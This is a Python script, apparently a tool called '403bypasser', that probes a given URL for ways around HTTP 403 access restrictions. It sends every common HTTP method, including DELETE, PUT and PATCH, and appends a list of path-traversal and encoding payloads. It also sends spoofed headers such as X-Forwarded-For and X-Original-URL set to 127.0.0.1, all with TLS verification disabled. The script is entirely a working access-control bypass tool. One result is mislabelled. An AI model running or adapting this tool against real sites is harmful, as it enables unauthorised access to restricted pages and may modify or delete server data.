import requests
import sys
import colorama
import time
from colorama import Fore, Style
import urllib3
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
print("python3 403bypasser.py https://www.example.com/ admin ( space between url and path )")
domain = sys.argv[1]
path = sys.argv[2]
url=domain+path
print("Using different methods " + "\n")
res1=requests.get(url, allow_redirects=False, verify=False, timeout= 5)
print( "using GET :" + "\t" +  str(res1.status_code))
res2=requests.post(url, allow_redirects=False, verify=False, timeout= 5)
print("using POST :" + "\t" +  str(res2.status_code))
res3=requests.head(url, allow_redirects=False, verify=False, timeout= 5)
print( "using HEAD :" + "\t" + Fore.YELLOW+ str(res3.status_code))
res4=requests.put(url, allow_redirects=False, verify=False, timeout= 5)
print("using PUT : "+ "\t" +  str(res4.status_code))
res5=requests.delete(url, allow_redirects=False, verify=False, timeout= 5)
print("using DELETE :"+ "\t" + Fore.YELLOW+str(res5.status_code))
res6=requests.patch(url, allow_redirects=False, verify=False, timeout= 5)
print("using PATCH :" + "\t" + Fore.YELLOW+ str(res6.status_code))
print("Using payloads at end of URL " + "\n")
payloads = ["/","/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23",".json"]
for payload in payloads:
	try:
		url2=url+payload
		res7=requests.get(url2, allow_redirects=False , verify=False, timeout=5)
		print( url2 + " : "+  str(res7.status_code))
	except:
		pass
print("Using different headers " + "\n")		
res8=requests.get(url, headers={'X-Forwarded-For':'127.0.0.1'} , allow_redirects=False ,  verify=False)		
print( "X-Forwarded-For" + " : "+  str(res8.status_code))

res9=requests.get(url, headers={'X-Forwarded-Host':'127.0.0.1'} , allow_redirects=False ,  verify=False)		
print( "X-Forwarded-Host" + " : "+  str(res9.status_code))

res10=requests.get(url, headers={'X-Host':'127.0.0.1'} , allow_redirects=False ,  verify=False)		
print( "X-Host" + " : "+  str(res10.status_code))

res11=requests.get(url, headers={'X-Custom-IP-Authorization':'127.0.0.1'} , allow_redirects=False ,  verify=False)		
print( "X-Custom-IP-Authorization" + " : "+  str(res11.status_code))

res12=requests.get(url, headers={'X-Original-URL':'127.0.0.1'} , allow_redirects=False ,  verify=False)		
print( "X-Original-URL" + " : "+  str(res12.status_code))

res13=requests.get(url, headers={'X-Originating-IP':'127.0.0.1'} , allow_redirects=False ,  verify=False)		
print( "X-Originating-IP" + " : "+  str(res13.status_code))

res14=requests.get(url, headers={'X-Remote-IP':'127.0.0.1'} , allow_redirects=False ,  verify=False)		
print( "X-Remote-IP" + " : "+  str(res14.status_code))

res14=requests.get(url, headers={'Real-Ip':'127.0.0.1'} , allow_redirects=False ,  verify=False)		
print( "X-Remote-IP" + " : "+  str(res14.status_code))

url3=domain+"/dev/null"
url4=domain+path
res15=requests.get(url3, headers={'X-Rewrite-URL':url4} , allow_redirects=False ,  verify=False)		
print( "X-Rewrite-URL" + " : "+  str(res15.status_code))

print("Completed" + "\n")
